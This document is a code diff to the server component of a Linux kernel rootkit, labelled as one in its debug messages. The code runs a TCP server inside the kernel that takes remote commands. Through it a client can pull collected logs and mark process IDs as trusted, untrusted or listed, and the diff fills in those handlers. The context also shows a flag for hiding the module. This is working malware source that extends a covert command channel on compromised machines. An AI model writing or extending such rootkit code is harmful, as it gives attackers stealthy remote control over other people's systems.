@@ -9,7 +9,6 @@ https://stackoverflow.com/questions/49340626/creating-a-tcp-server-in-the-kernel
 #include <linux/inet.h>
 #include <linux/socket.h>
 #include <net/sock.h>
-#include <linux/string.h>
 
 #include "server.h"
 
@@ -31,7 +30,7 @@ extern bool module_hidden;
 extern int trust_pid(int);
 extern int untrust_pid(int);
 extern bool check_pid_trusted(int);
-extern int list_trusted_pids(void);
+extern int list_trusted_pids(char *);
 
 static int run_server(void *port){
 	int err;
@@ -76,7 +75,7 @@ static int run_server(void *port){
 			printk("[rootkit][server.c::run_server] ERROR    unable to accept connection: err=%d\n", err); //DEBUG
 			return err;
 		}
-		printk("[rootkit] run_server- client accepted\n");
+		printk("[rootkit][server.c::run_server] DEBUG   client accepted\n"); //DEBUG
 		err = client_handler();
 		if (err<0){
 			printk("[rootkit][server.c::run_server] ERROR    error when handling client: err=%d\n", err); //DEBUG
@@ -168,8 +167,8 @@ static int client_handler(void){
 		net_recv();
 		printk("[rootkit][server.c::client_handler] DEBUG    recieved %s\n", client.message); //DEBUG
 		if (strcmp("logs", client.message)==0){
-			printk("[rootkit][server.c::client_handler] DEBUG    commanf logs running\n"); //DEBUG
-			get_logs(client.message); //cpies logs into message buffer
+			printk("[rootkit][server.c::client_handler] DEBUG    command logs running\n"); //DEBUG
+			get_logs(client.message); //copies logs into message buffer
 			printk("[rootkit][server.c::client_handler] DEBUG    read log files\n");  //DEBUG
 			net_send();
 		}
@@ -206,13 +205,46 @@ static int client_handler(void){
 			}
 		}
 		else if (strncmp("pid trust", client.message, 9)==0){
-			continue;
+			int pid, res;
+			res = (int) kstrtoint(client.message+10, 10, &pid); //converts the PID passed to an int
+			if (res==0){
+				res = trust_pid(pid);
+				if (res==0){
+					sprintf(client.message, "[server.c::client_handler] now trusting PID %i", pid);
+					net_send();
+				}
+				else if (res==1){
+					sprintf(client.message, "[server.c::client_handler] already trusting PID %i", pid);
+					net_send();
+				}
+			}
+			else{
+				sprintf(client.message, "[server.c::client_handler] error trusting PID %i err:%i\n", pid, res);
+				net_send();
+			}
 		}
 		else if (strncmp("pid untrust", client.message, 11)==0){
-			continue;
+			int pid, res;
+			res = (int) kstrtoint(client.message+12, 10, &pid); //converts the PID passed to an int
+			if (res==0){
+				res=untrust_pid(pid);
+				if (res==0){
+					sprintf(client.message, "[server.c::client_handler] stopped trusting PID %i", pid);
+					net_send();
+				}
+				else if (res==1){
+					sprintf(client.message, "[server.c::client_handler] already not trusting PID %i", pid);
+					net_send();
+				}
+			}
+			else{
+				sprintf(client.message, "[rootkit][server.c::client_handler] error stopping trusting PID %i err:%i\n", pid, res);
+				net_send();
+			}
 		}
-		else if (strncmp("pid list", client.message, 8)==0){
-			continue;
+		else if (strcmp("pid list", client.message)==0){
+			list_trusted_pids(client.message);
+			net_send();
 		}
 	}
 }
